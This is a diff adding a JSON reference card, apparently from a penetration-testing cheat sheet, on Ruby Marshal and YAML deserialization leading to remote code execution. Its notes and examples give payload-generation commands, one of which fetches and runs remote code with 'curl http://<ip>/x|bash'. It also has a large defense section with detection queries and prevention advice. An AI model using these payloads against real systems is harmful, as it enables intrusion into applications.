@@ -1,0 +1,108 @@
+{
+  "id": "deser-ruby-universal",
+  "name": "Ruby Marshal.load Universal Deserialization RCE",
+  "command": "ruby universal_rce.rb \"<command>\" > payload.bin",
+  "description": "Ruby's Marshal.load reconstructs arbitrary objects and, via a universal gadget chain that abuses Gem::Requirement / Gem::Installer / Gem::StubSpecification present in the standard library, reaches code execution without any third-party dependency. A single public gadget (the Universal Deserialisation Gadget) turns any Marshal.load of attacker data into RCE; YAML.load (Psych) is similarly abusable.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "quiet",
+  "category": "Web Exploitation",
+  "subcategory": "Deserialization",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Universal Deserialisation Gadget for Ruby (devcraft.io)",
+  "tags": [
+    "deserialization",
+    "ruby",
+    "marshal",
+    "universal-gadget",
+    "psych",
+    "yaml",
+    "rce"
+  ],
+  "mitre": [
+    "T1190",
+    "T1059"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== IDENTIFY A RUBY MARSHAL SINK ===\n  # Marshal.load / Marshal.restore on request data, cookies, caches (Rails Marshal cache store),\n  # ActiveSupport::MessageVerifier blobs with a known/leaked secret, or YAML.load (Psych).\n  # Raw Marshal streams begin with bytes 04 08 (version 4.8).\n\n=== UNIVERSAL GADGET (no gems required) ===\n  # The public universal_rce.rb builds a Marshal payload using only stdlib classes\n  # (Gem::Requirement -> Gem::DependencyList / Gem::Source::Git -> Kernel#system).\n  # Generate and deliver:\n  ruby universal_rce.rb \"id\" > payload.bin\n  ruby universal_rce.rb \"curl http://<ip>/x|bash\" | base64 -w0\n  # Server-side Marshal.load(payload) fires the chain -> command runs.\n\n=== TRIGGER ===\n  # Anything doing:\n  Marshal.load(Base64.decode64(params[:data]))   # RCE\n\n=== YAML / PSYCH VARIANT ===\n  # Vulnerable: YAML.load(data) on old Psych (pre safe-by-default).\n  # Payload uses the same Gem:: gadget serialized as a YAML object graph\n  # (e.g. !ruby/object:Gem::Requirement ...). Safe API: YAML.safe_load / Psych.safe_load.\n\n=== RAILS NOTES ===\n  # Rails cookie/session RCE historically needed the secret_key_base; the Marshal\n  # universal gadget needs only a raw Marshal.load sink, no secret.\n\n=== ALTERNATIVES ===\n  Python pickle __reduce__ - see deser-python-pickle\n  Node.js node-serialize - see deser-nodejs",
+  "examples": [
+    {
+      "label": "Generate universal Marshal RCE payload",
+      "command": "ruby universal_rce.rb \"id\" > payload.bin"
+    },
+    {
+      "label": "Base64 payload for a cookie/parameter",
+      "command": "ruby universal_rce.rb \"id\" | base64 -w0"
+    },
+    {
+      "label": "Confirm a Marshal blob (magic 04 08)",
+      "command": "xxd payload.bin | head -1"
+    }
+  ],
+  "references": [
+    {
+      "title": "Universal Deserialisation Gadget for Ruby 2.x-3.x",
+      "url": "https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html"
+    },
+    {
+      "title": "PortSwigger - Insecure deserialization",
+      "url": "https://portswigger.net/web-security/deserialization"
+    },
+    {
+      "title": "OWASP Deserialization Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "exploit-deserialization",
+      "note": "Generic multi-language deserialization hub card.",
+      "rel": "prereq"
+    },
+    {
+      "id": "deser-python-pickle",
+      "note": "Python pickle RCE, a sibling runtime.",
+      "rel": "alternative"
+    },
+    {
+      "id": "deser-nodejs",
+      "note": "Node.js serialization RCE, a sibling runtime.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Marshal.load rebuilds any object and invokes its reconstruction hooks. The universal gadget chains stdlib RubyGems classes so that deserialization alone calls Kernel#system, requiring no third-party gems and no application secret. Psych YAML.load resolves the same object tags.",
+    "prerequisites": "A Marshal.load (or non-safe YAML.load) on data the attacker controls - request param, cookie, Marshal-backed cache, or message.",
+    "impact": "Remote code execution as the Ruby/Rails process user.",
+    "detection": "[MITRE T1190] Inbound blobs beginning with the 04 08 Marshal header or !ruby/object YAML tags; [MITRE T1059] the ruby process spawning sh/bash children.",
+    "artifacts": "Web/proxy logs with Marshal (\\x04\\x08) or base64 blobs and !ruby/object tags; EDR/auditd process tree ruby -> sh/bash; unexpected outbound from the app host.",
+    "splunk_spl": "index=web (request_body=\"*!ruby/object*\" OR request_body=\"*\\\\x04\\\\x08*\")\n| table _time, src_ip, uri_path, request_body",
+    "elastic_kql": "http.request.body.content:(*!ruby\\/object* or *BAh*)",
+    "sentinel_kql": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"ruby\",\"ruby.exe\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+    "sigma_rules": "ruby_marshal_deserialization_shell_child",
+    "prevention": "Never Marshal.load untrusted data; use JSON. Use YAML.safe_load / Psych.safe_load only. For Rails sessions/caches use a signed+encrypted JSON serializer (not :marshal); keep secret_key_base secret; run workers least-privileged.",
+    "sources": [
+      "https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html",
+      "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Ruby process spawning a shell (Marshal RCE)",
+        "logic": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"ruby\",\"ruby.exe\")\n| where FileName in~ (\"sh\",\"bash\",\"dash\",\"cmd.exe\",\"curl\",\"wget\")\n| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, FileName, ProcessCommandLine",
+        "data_source": "edr",
+        "attack": [
+          "T1059"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Rails tasks or tooling that legitimately shell out",
+        "tuning": "Scope to web/worker tiers; allowlist deploy and cron identities"
+      }
+    ]
+  }
+}
